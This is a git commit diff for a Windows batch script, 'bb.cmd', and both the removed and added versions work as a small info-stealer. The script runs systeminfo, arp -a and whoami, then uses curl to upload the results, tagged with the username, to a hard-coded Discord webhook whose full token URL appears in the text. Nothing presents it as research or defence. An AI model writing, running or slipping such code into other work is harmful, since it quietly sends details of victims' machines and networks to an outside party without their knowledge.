974afbd44f65d93e8a92fbc12eb35c54c256c6bc
lsecanon <sherapsy@gmail.com>
2025-03-15 13:51:31 -0700

    Update bb.cmd

--- bb.cmd
+++ bb.cmd
@@ -1,9 +1,7 @@
-mkdir %userprofile%\desktop\bb
-attrib -s -h -i -x %userprofile%\desktop\bb
-systeminfo > %userprofile%\desktop\bb\systeminfo.txt
-pause
-arp -a > %userprofile%\desktop\bb\arp.txt
-pause
-for /f "delims=" %n in ('whoami') do set name=%n
-curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" -F "content=Here's the latest log file!" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
-pause
+setlocal EnableDelayedExpansion
+cd %~dp0
+systeminfo > systeminfo.txt
+arp -a > arp.txt
+for /f "delims=" %%b in ('whoami') do set name=%%b
+curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
+curl -F "file=@%userprofile%\desktop\bb\arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
